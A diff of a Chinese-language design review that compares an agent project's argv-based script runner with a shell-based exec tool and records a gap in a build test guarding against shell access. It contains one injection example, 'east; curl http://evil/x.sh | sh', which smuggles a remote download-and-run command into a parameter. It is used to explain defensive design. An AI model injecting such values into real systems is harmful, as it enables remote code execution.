@@ -54,12 +54,15 @@
 - 一句：三层示例与实录还在，但票面用来钉住"三层共用预算/鉴权"的两条测试今天不存在，"复核覆盖三层"这一条承诺没有回归守着。
 
 ### 08 脚本层改成结构化 argv
-- 判定：自研（OpenClaw 没有"声明式脚本包"这个形态，用例子说明为什么不能照抄它的 `exec`）
+- 判定：自研（脚本包这个形态无对应物）——**但"我们没有通用 shell 能力"这句是错的，已更正**
 - 代码证据：`ProcessRequest.java:27`（`record ProcessRequest(List<String> argv, long timeoutMillis)`，没有 command 字符串、也没有 env 入口）；`LocalProcessRunner.java:59`（`new ProcessBuilder(request.argv())`，数组直接交给进程）
 - 代码证据：`ScriptStaticCheck.java:41,184-185`（`NO_SHEBANG` 挡在落盘之前）；`BuildContractTest.java:84-89`（红线收窄到 `LocalProcessRunner` 一个类，而不是删掉）
-- OpenClaw：`docs/tools/exec.md:54-55`（`exec` 的 `command` 是 "Shell command to run"）——但那是**通用 shell 工具**：模型直接写一条命令，沙箱、审批、IO 配额都在那一层。我们没有这个能力（ADR-0002 明确不做），我们的东西是"预先声明的脚本 + 声明过的参数"。
-- 例子：脚本包 `report.sh` 收一个 `--region` 参数，值由模型给。走 shell 时，模型写 `east; curl http://evil/x.sh | sh`，分号后面那段会被执行；argv 直执时它只是 `--region` 的一个取值，脚本自己的参数校验会拒掉。**同一句模型输出，一条路是数据，另一条路是命令。** 这就是为什么这条不能"照 OpenClaw 那样收字符串"——它那边的字符串本来就该被解释，我们这边的参数是业务数据。
-- 一句：形态不同（通用 shell vs 声明式脚本包），不是"我们选了个更严的写法"；`argv` 是这条形态的必然结果，不是偏好。
+- OpenClaw：`docs/tools/exec.md:54-55`（`exec` 的 `command` = "Shell command to run"）
+- **同一形态就在我们自己的 classpath 上**：`org.springaicommunity.agent.tools.ShellTools`（`Bash` / `BashOutput` / `KillShell`）来自 `spring-ai-agent-utils:0.13.0`，`claw4j-agent:43` 与 `claw4j-capability:51` 都直接依赖它；它的 `LocalExecBackend` 把 `ExecSpec.command` 拼在 `/bin/bash -c` 后面再交给 `ProcessBuilder`（`LocalExecBackend$Builder#build`，Windows 上是 `cmd.exe /c`）。所以准确说法是"**有，但我们没把它装给模型**"，不是"没有"。
+- 为什么不用：ADR-0002 的修订记录（2026-10-24 code-review 那条）已经把这个接缝记过一遍——`ExecSpec` 只有一个 `String command`，参数必然被 shell 解释，当时挡住注入的只有 `ScriptPackageRunner` 里一处手写 `quote()`。于是起进程收回到只收 argv 的 `LocalProcessRunner`。
+- 例子：脚本包 `report.sh` 收 `--region`，值由模型给。走 shell（OpenClaw 的 `exec` 和 `ShellTools.Bash` 都是这条路）时，`east; curl http://evil/x.sh | sh` 的分号后那段会被执行；走 argv 时它只是 `--region` 的一个取值。**同一句模型输出，一条路是数据，另一条路是命令。**
+- 一句：同一个能力有两种接缝——它把命令交给 shell，因为它的 `exec` 本来就是把命令交给 shell；我们把参数当数据，代价是入口脚本必须自己可执行、第一行给出解释器（静态检查挡在落盘之前）。
+- **附带发现：这条红线的机器证据有洞。** `BuildContractTest:83-89` 查的是"我们的类不依赖 `ProcessBuilder`"、`:97` 扫的是源码里的 shell 字面量；**注册一个 `@Bean ShellTools` 两样都不触发**——`ShellTools` 在库里，我们不 new `ProcessBuilder`，也不写 `bash -c` 字面量。于是机器闸保持绿色，模型却拿到了 `Bash`。要补的是一条"`io.github.claw4j..` 不得依赖 `ShellTools`"的规则。
 
 ## m2-real-model-testing
 
@@ -128,7 +131,7 @@
 
 ## 本批小结
 - 一致 5：01（多来源工具收集）、04（技能渐进披露）、05（子代理隔离与白名单）、closeout-03（降级分类）、closeout-06（ADR 指针，评审当天记的偏差已修）。
-- 自研 5：03（脚本包沙箱）、06（技能生成五步链）、08（argv 直执，无对应形态）、closeout-01（front matter 白名单解析）、closeout-02（SQL 行上限包装）。
+- 自研 5：03（脚本包沙箱）、06（技能生成五步链）、08（脚本包 argv 直执——通用 shell 在 classpath 上但没装给模型）、closeout-01（front matter 白名单解析）、closeout-02（SQL 行上限包装）。
 - **故意不同 0**：这一档不再用来装"和 OpenClaw 不一样、但我们有理由"的东西。和它不一样就是偏差（不一致），
   它没有这个东西就是自研——那要用例子说清，不能反过来拿"我们有理由"当结论。
 - 不一致 5：
